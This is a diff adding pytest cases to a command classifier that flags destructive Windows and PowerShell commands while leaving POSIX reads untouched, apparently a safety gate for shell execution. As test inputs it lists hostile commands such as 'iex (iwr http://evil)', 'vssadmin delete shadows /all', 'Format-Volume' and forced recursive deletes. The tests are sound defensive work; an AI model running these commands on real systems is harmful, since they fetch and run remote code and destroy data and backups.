@@ -3931,6 +3931,14 @@ class TestPowerShellLane:
     def test_out_string_is_read(self):
         assert self._run('powershell.exe -Command "Out-String"').is_mutative is False
 
+    def test_hyphenated_path_arg_in_command_is_read(self):
+        # rc.4: the hyphenated path argument must not be read as a cmdlet.
+        r = self._run(
+            'powershell.exe -NoProfile -Command '
+            '"Get-ChildItem C:\\Users\\jorge\\my-folder -Recurse"'
+        )
+        assert r.is_mutative is False
+
     # --- change verbs -> T3 (closes the false negative) ----------------------
     def test_remove_item_with_noprofile_is_mutative(self):
         r = self._run('powershell.exe -NoProfile -Command "Remove-Item -Recurse foo"')
@@ -3986,3 +3994,145 @@ class TestPowerShellLane:
         script.write_text("Remove-Item -Recurse -Force C:/data\n")
         r = detect_mutative_command(f"pwsh -File {script}")
         assert r.is_mutative is True
+
+
+class TestBareWindowsCommandLane:
+    """rc.4 hole: a PEELED cmdlet (no powershell.exe wrapper), a cmd.exe
+    builtin, or a PowerShell alias fell to safe-by-elimination (T0) under the
+    POSIX verb scanner and mutated without a gate.  The bare-Windows lane
+    inverts the default to conservative DEFAULT-DENY *scoped to recognized
+    Windows tokens* -- unknown verb/cmdlet/subcommand -> T3 -- while leaving
+    bash/POSIX classification untouched."""
+
+    def _mut(self, cmd):
+        return detect_mutative_command(cmd).is_mutative
+
+    # --- peeled destructive cmdlets / builtins -> T3 (closes false negative) --
+    @pytest.mark.parametrize("cmd", [
+        "Remove-Item C:\\x -Recurse -Force",
+        "del C:\\x /s /q",
+        "rd /s /q C:\\x",
+        "Clear-Disk",
+        "Format-Volume",
+        "Set-ExecutionPolicy Bypass",
+        "Stop-Computer",
+    ])
+    def test_peeled_destructive_is_mutative(self, cmd):
+        assert self._mut(cmd) is True
+
+    # --- peeled read -> T0 (Test-1-must-stay-free) ---------------------------
+    @pytest.mark.parametrize("cmd", [
+        "Get-ChildItem C:\\x -Recurse",
+        "Get-ChildItem | Measure-Object",
+        "dir",
+        "type foo",
+        "Format-Table",
+    ])
+    def test_peeled_read_is_not_mutative(self, cmd):
+        assert self._mut(cmd) is False
+
+    # --- rc.4 refinement: a hyphenated PATH argument is NOT a cmdlet ----------
+    # Only the FIRST token of each composition stage is classified by verb; a
+    # Verb-Noun-shaped path/flag argument ('my-folder', 'a-b') sits in an
+    # argument position and must not force a false T3 on a legitimate read.
+    @pytest.mark.parametrize("cmd", [
+        "Get-ChildItem C:\\Users\\jorge\\my-folder",
+        "Get-ChildItem C:\\my-folder -Recurse",
+        "dir C:\\my-app\\sub-dir",
+        "Get-Content C:\\a-b\\file.txt",
+        "Get-ChildItem C:\\a-b\\c-d\\e-f -Recurse",  # many hyphen segments
+        "Get-Content C:\\path\\Remove-Item-notes.txt",  # cmdlet name in a path arg
+    ])
+    def test_hyphenated_path_arg_is_not_read_as_cmdlet(self, cmd):
+        assert self._mut(cmd) is False
+
+    # --- alias resolution ----------------------------------------------------
+    @pytest.mark.parametrize("cmd,mut", [
+        ("rm -r -fo C:\\x", True),   # pre-empted by COMMAND_ALIASES, still T3
+        ("del C:\\x", True),
+        ("ls", False),
+        ("cat foo", False),
+        ("gci C:\\x", False),        # PS alias -> Get-ChildItem
+        ("gc foo", False),           # PS alias -> Get-Content
+        ("cd /repo", False),         # navigation alias -> Set-Location (benign)
+        ("move a b", True),          # cmd.exe builtin + alias -> Move-Item
+    ])
+    def test_alias_resolution(self, cmd, mut):
+        assert self._mut(cmd) is mut
+
+    # --- ambiguous verbs split by noun ---------------------------------------
+    def test_format_table_is_read_but_format_volume_is_mutative(self):
+        assert self._mut("Format-Table") is False
+        assert self._mut("Format-Volume") is True
+
+    def test_out_string_is_read_but_out_file_is_mutative(self):
+        assert self._mut("Out-String") is False
+        assert self._mut("Out-File report.txt") is True
+
+    def test_clear_content_and_clear_disk_are_mutative(self):
+        assert self._mut("Clear-Content foo.txt") is True
+        assert self._mut("Clear-Disk") is True
+
+    # --- obfuscation / arbitrary execution -> T3 -----------------------------
+    @pytest.mark.parametrize("cmd", [
+        "iex (iwr http://evil)",
+        "iwr x|iex",
+        "Invoke-Expression $payload",
+        "Invoke-Command -ScriptBlock { rm x }",
+        "Start-Process evil.exe",
+    ])
+    def test_obfuscation_and_execution_is_mutative(self, cmd):
+        assert self._mut(cmd) is True
+
+    # --- cmd.exe two-token builtins ------------------------------------------
+    @pytest.mark.parametrize("cmd,mut", [
+        ("reg delete HKCU\\x /f", True),
+        ("reg add HKCU\\x /v y /d z", True),
+        ("reg query HKCU\\x", False),
+        ("sc create foo binPath= c:\\x", True),
+        ("sc delete foo", True),
+        ("sc query foo", False),
+        ("vssadmin delete shadows /all", True),
+        ("vssadmin list shadows", False),
+        ("reg frobnicate HKCU\\x", True),   # unknown subcommand -> default-deny
+    ])
+    def test_cmd_subcommand_builtins(self, cmd, mut):
+        assert self._mut(cmd) is mut
+
+    # --- default-deny fallback -----------------------------------------------
+    def test_unknown_verb_peeled_cmdlet_is_mutative(self):
+        assert self._mut("Frobnicate-Thing") is True
+
+    def test_unknown_noun_read_cmdlet_stays_read(self):
+        assert self._mut("Get-FooBar") is False
+
+    # --- composition: MAX across stages --------------------------------------
+    def test_composition_read_piped_to_change_is_mutative(self):
+        assert self._mut("Get-ChildItem | Remove-Item -Recurse -Force") is True
+
+    def test_composition_all_read_is_not_mutative(self):
+        assert self._mut("Get-ChildItem | Sort-Object | Select-Object") is False
+
+    # --- BASH / POSIX must NOT regress ---------------------------------------
+    @pytest.mark.parametrize("cmd", [
+        "docker-compose up -d",     # hyphenated POSIX name, verb not a PS verb
+        "pre-commit run --all",     # hyphenated POSIX name
+        "git status",
+        "kubectl get pods",
+        "npm run build" if False else "ls -la",  # keep simple read cmds free
+    ])
+    def test_bash_hyphenated_and_read_not_regressed(self, cmd):
+        assert self._mut(cmd) is False
+
+    def test_bare_windows_lane_returns_none_for_posix(self):
+        # White-box: the lane itself defers (None) for a non-Windows token, so
+        # POSIX classification (and its rm-scratch / mkdir overrides) is intact.
+        from modules.security.mutative_verbs import (
+            _check_windows_native_command,
+        )
+        from modules.security.command_semantics import analyze_command
+        for cmd in ("docker-compose up", "git push", "terraform apply"):
+            s = analyze_command(cmd)
+            assert _check_windows_native_command(
+                cmd, s.base_cmd, "unknown", s,
+            ) is None
